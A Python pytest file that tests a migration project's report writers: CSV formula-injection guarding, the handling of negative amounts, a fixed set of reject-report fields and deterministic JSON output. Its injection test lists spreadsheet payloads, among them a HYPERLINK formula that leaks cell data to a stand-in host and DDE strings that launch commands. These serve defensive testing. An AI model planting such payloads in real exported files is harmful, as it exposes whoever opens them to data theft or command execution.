"""Guards on the cutover's report writers.

The reject report is written from text somebody typed into the system we are
migrating away from, and it is opened in Excel by the person who has to fix
those rows. That combination is the reason this file exists: a report that
executes when opened would turn a migration artifact into an attack on the
finance team, and it would do it using the client's own data.
"""

from __future__ import annotations

import csv
import dataclasses
import json
from datetime import date, datetime
from decimal import Decimal
from pathlib import Path

import pytest

from scripts.migration.reporting import (
    REJECT_COLUMNS,
    Reject,
    is_number,
    spreadsheet_safe,
    write_csv,
    write_json,
    write_rejects,
)

# --------------------------------------------------------------------------- #
# Formula injection
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    "payload",
    [
        "=1+1",
        '=HYPERLINK("http://evil.example/?x="&A1,"Click")',
        "@SUM(A1:A9)",
        "+cmd|'/c calc'!A0",
        "-2+3+cmd|'/c calc'!A0",
        "\t=1+1",
        "\r=1+1",
    ],
)
def test_a_source_cell_cannot_become_a_formula(payload: str) -> None:
    """Excel decides on the leading character, so that is what is guarded."""
    assert spreadsheet_safe(payload).startswith("'")


def test_the_guard_survives_a_round_trip_through_a_real_csv_reader(tmp_path: Path) -> None:
    """Written and read back, the dangerous cell is still inert."""
    path = tmp_path / "rejects.csv"
    write_csv(path, columns=["value"], rows=[{"value": "=1+1"}])
    with path.open(encoding="utf-8") as handle:
        rows = list(csv.reader(handle))
    assert rows[1] == ["'=1+1"]


# --------------------------------------------------------------------------- #
# ...without corrupting the report it is protecting
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize("payload", ["-1500.00", "-0.01", "+250000", "-1E3", "1500.00"])
def test_a_negative_amount_is_not_mistaken_for_a_formula(payload: str) -> None:
    """A reject report is full of negative money.

    Reversals, credits and over-allocations all start with ``-``. Guarding them
    would put an apostrophe in front of every one and turn the column an
    operator needs to sum into text.
    """
    assert spreadsheet_safe(payload) == payload


def test_a_value_that_is_not_a_number_is_still_guarded() -> None:
    """The number check is the discriminator, not an escape hatch."""
    assert is_number("-1500.00") is True
    assert is_number("-2+3+cmd") is False
    assert spreadsheet_safe("-2+3+cmd") == "'-2+3+cmd"


@pytest.mark.parametrize(
    ("payload", "expected"),
    [
        ("SPA-00147", "SPA-00147"),
        ("HRD-01", "HRD-01"),
        ("Unit not found in the validated inventory source.", None),
        ("", ""),
        (None, ""),
    ],
)
def test_ordinary_values_pass_through_untouched(payload: object, expected: str | None) -> None:
    result = spreadsheet_safe(payload)
    assert result == (expected if expected is not None else str(payload))
    assert not result.startswith("'")


def test_money_and_dates_keep_their_exact_written_form() -> None:
    """No float anywhere near a figure that has to reconcile."""
    assert spreadsheet_safe(Decimal("250000.00")) == "250000.00"
    assert spreadsheet_safe(date(2026, 9, 5)) == "2026-09-05"
    assert spreadsheet_safe(datetime(2026, 9, 5, 6, 0, 17)) == "2026-09-05T06:00:17"


# --------------------------------------------------------------------------- #
# Report shape
# --------------------------------------------------------------------------- #


def test_columns_are_declared_not_inferred(tmp_path: Path) -> None:
    """A row missing a key leaves a blank cell, it does not reshape the file."""
    path = tmp_path / "report.csv"
    write_csv(path, columns=["a", "b"], rows=[{"a": "1"}, {"a": "2", "b": "3"}])
    with path.open(encoding="utf-8") as handle:
        rows = list(csv.reader(handle))
    assert rows == [["a", "b"], ["1", ""], ["2", "3"]]


#: The complete reject record. A closed set, asserted as one, because the
#: protection here is structural: a field that does not exist cannot be filled
#: in later by somebody being helpful.
EXPECTED_REJECT_FIELDS = {
    "source_file",
    "row",
    "reference",
    "field",
    "code",
    "reason",
    "severity",
}


def test_the_reject_record_is_a_closed_set_of_locators_and_codes() -> None:
    """Nothing here is a general-purpose carrier of source content.

    An earlier version had a ``value`` field for "the supplied value where
    safe". That is the right long-term rule and it is not yet provable: deciding
    which fields are safe to quote needs a canonical intake contract that says
    which of them can hold identity, and no such contract exists until the real
    source does. So the field is gone rather than guarded by a comment.
    """
    assert set(REJECT_COLUMNS) == EXPECTED_REJECT_FIELDS
    assert {f.name for f in dataclasses.fields(Reject)} == EXPECTED_REJECT_FIELDS


def test_no_field_exists_to_echo_a_source_value() -> None:
    """The specific field that was removed, named so it does not come back quietly."""
    assert "value" not in REJECT_COLUMNS
    assert "value" not in {f.name for f in dataclasses.fields(Reject)}
    for forbidden in ("name", "email", "phone", "passport", "iban", "bank", "raw", "row_data"):
        assert not any(forbidden in column for column in REJECT_COLUMNS), forbidden


def test_the_reject_report_reads_the_way_an_operator_needs_it(tmp_path: Path) -> None:
    path = tmp_path / "rejects.csv"
    written = write_rejects(
        path,
        [
            Reject(
                source_file="sales.csv",
                row=42,
                reference="SPA-00147",
                field="unit_reference",
                code="UNKNOWN_UNIT",
                reason="Sale references a unit not found in the validated inventory source.",
            )
        ],
    )
    assert written == 1
    with path.open(encoding="utf-8") as handle:
        row = next(iter(csv.DictReader(handle)))
    assert row["source_file"] == "sales.csv"
    assert row["row"] == "42"
    assert row["reference"] == "SPA-00147"
    assert row["code"] == "UNKNOWN_UNIT"
    assert row["severity"] == "blocking"


# --------------------------------------------------------------------------- #
# The machine-readable half
# --------------------------------------------------------------------------- #


def test_money_reaches_json_as_a_string_never_a_float(tmp_path: Path) -> None:
    """``249999.99999999997`` in an evidence artifact is worse than no artifact."""
    path = tmp_path / "reconciliation.json"
    write_json(path, {"gsv": Decimal("250000.00"), "lines": [{"amount": Decimal("0.10")}]})
    payload = json.loads(path.read_text(encoding="utf-8"))
    assert payload["gsv"] == "250000.00"
    assert payload["lines"][0]["amount"] == "0.10"


def test_two_runs_of_one_batch_produce_a_diffable_file(tmp_path: Path) -> None:
    """Sorted keys, because "did anything change since the trial?" is the question."""
    first, second = tmp_path / "a.json", tmp_path / "b.json"
    write_json(first, {"b": 1, "a": 2})
    write_json(second, {"a": 2, "b": 1})
    assert first.read_text(encoding="utf-8") == second.read_text(encoding="utf-8")
    assert first.read_text(encoding="utf-8").endswith("\n")


def test_a_set_is_refused_rather_than_serialised_in_some_order(tmp_path: Path) -> None:
    """The writer promises diffable evidence, so it may not accept an unordered container.

    Two runs of the same batch could serialise the same finding differently, and
    the difference would look like a change in the data rather than in the
    iteration. Ordering it here would be a coin toss; ordering it at the call
    site is a decision somebody made.
    """
    with pytest.raises(TypeError, match="no order"):
        write_json(tmp_path / "r.json", {"codes": {"UNKNOWN_UNIT", "BAD_DATE"}})
    with pytest.raises(TypeError, match="no order"):
        write_json(tmp_path / "r.json", {"codes": frozenset({"A"})})


def test_an_explicitly_ordered_list_is_accepted(tmp_path: Path) -> None:
    path = tmp_path / "r.json"
    write_json(path, {"codes": sorted({"UNKNOWN_UNIT", "BAD_DATE"})})
    assert json.loads(path.read_text(encoding="utf-8"))["codes"] == ["BAD_DATE", "UNKNOWN_UNIT"]
